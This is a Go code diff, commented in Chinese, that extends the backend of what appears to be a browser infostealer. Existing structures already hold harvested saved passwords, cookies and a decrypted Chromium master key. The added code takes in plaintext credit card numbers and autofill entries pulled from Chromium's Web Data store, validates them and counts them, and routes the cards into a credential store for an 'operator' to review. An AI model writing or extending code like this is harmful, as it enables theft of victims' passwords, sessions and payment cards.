@@ -36,6 +36,25 @@ type BrowserCookie struct {
 	HTTPOnly bool   `json:"httponly,omitempty"`
 }
 
+// BrowserCard 一条信用卡（Chromium 的 `Web Data` → credit_cards）
+type BrowserCard struct {
+	Name     string `json:"name,omitempty"` // 持卡人
+	Number   string `json:"number"`         // 明文卡号（客户端 v10/v20 解出）
+	ExpMonth int    `json:"exp_month,omitempty"`
+	ExpYear  int    `json:"exp_year,omitempty"`
+	Nickname string `json:"nickname,omitempty"`
+}
+
+// BrowserAutofill 一条自动填充条目（字段名 → 值，Chromium 不加密）
+//
+// **不入库**：噪声远大于信号（一个用户几百条地址碎片），留在制品 JSON 里
+// 由操作员按需查看；信用卡才进凭据库。
+type BrowserAutofill struct {
+	Field string `json:"field"`
+	Value string `json:"value"`
+	Count int    `json:"count,omitempty"`
+}
+
 type BrowserProfile struct {
 	Name        string              `json:"name"`    // chrome / edge
 	Profile     string              `json:"profile"` // Default / Profile 1
@@ -44,6 +63,8 @@ type BrowserProfile struct {
 	MasterKey   string              `json:"master_key,omitempty"` // base64（用户作用域已解密，便于后续复用）
 	Credentials []BrowserCredential `json:"credentials"`
 	Cookies     []BrowserCookie     `json:"cookies"`
+	Cards       []BrowserCard       `json:"cards,omitempty"`    // Web Data：信用卡
+	Autofill    []BrowserAutofill   `json:"autofill,omitempty"` // Web Data：自动填充
 }
 
 type BrowserArtifact struct {
@@ -60,8 +81,10 @@ func (a BrowserArtifact) Info() ArtifactInfo {
 	for _, b := range a.Browsers {
 		info.Credentials += len(b.Credentials)
 		info.Cookies += len(b.Cookies)
+		info.Cards += len(b.Cards)
+		info.Autofill += len(b.Autofill)
 	}
-	info.Entries = info.Credentials + info.Cookies
+	info.Entries = info.Credentials + info.Cookies + info.Cards + info.Autofill
 	return info
 }
 
@@ -96,7 +119,7 @@ func ParseBrowserArtifact(path string) (BrowserArtifact, error) {
 		return art, fmt.Errorf("制品不含任何浏览器配置（采集失败或浏览器未安装）")
 	}
 
-	creds, cookies := 0, 0
+	creds, cookies, cards, autofill := 0, 0, 0, 0
 	for i := range art.Browsers {
 		b := &art.Browsers[i]
 		// 缺字段的条目直接丢弃：url 或口令为空的"凭据"没有意义，
@@ -125,11 +148,32 @@ func ParseBrowserArtifact(path string) (BrowserArtifact, error) {
 		}
 		b.Cookies = ck
 
+		// 信用卡：没有卡号的条目没有意义（解密失败的那张卡客户端不会写进来）
+		cd := b.Cards[:0]
+		for _, c := range b.Cards {
+			if strings.TrimSpace(c.Number) == "" {
+				continue
+			}
+			cd = append(cd, c)
+		}
+		b.Cards = cd
+
+		af := b.Autofill[:0]
+		for _, a := range b.Autofill {
+			if strings.TrimSpace(a.Field) == "" || strings.TrimSpace(a.Value) == "" {
+				continue
+			}
+			af = append(af, a)
+		}
+		b.Autofill = af
+
 		creds += len(b.Credentials)
 		cookies += len(b.Cookies)
+		cards += len(b.Cards)
+		autofill += len(b.Autofill)
 	}
-	if creds == 0 && cookies == 0 {
-		return art, fmt.Errorf("制品中没有任何可用的口令或 Cookie 条目")
+	if creds == 0 && cookies == 0 && cards == 0 && autofill == 0 {
+		return art, fmt.Errorf("制品中没有任何可用的口令/Cookie/信用卡/自动填充条目")
 	}
 	if creds > MaxCredentialItems {
 		return art, fmt.Errorf("制品口令条数超限: %d", creds)
@@ -137,8 +181,20 @@ func ParseBrowserArtifact(path string) (BrowserArtifact, error) {
 	if cookies > MaxBrowserCookies {
 		return art, fmt.Errorf("制品 Cookie 条数超限: %d", cookies)
 	}
+	if cards > MaxBrowserCards {
+		return art, fmt.Errorf("制品信用卡条数超限: %d", cards)
+	}
+	if autofill > MaxBrowserAutofill {
+		return art, fmt.Errorf("制品自动填充条数超限: %d", autofill)
+	}
 	return art, nil
 }
+
+// MaxBrowserCards / MaxBrowserAutofill 与客户端 maxCardItems / maxAutofillItems 一致
+const (
+	MaxBrowserCards    = 200
+	MaxBrowserAutofill = 300
+)
 
 // MaxCredentialItems 单次制品允许的口令条数上限（与客户端采集上限一致）
 const MaxCredentialItems = 2000
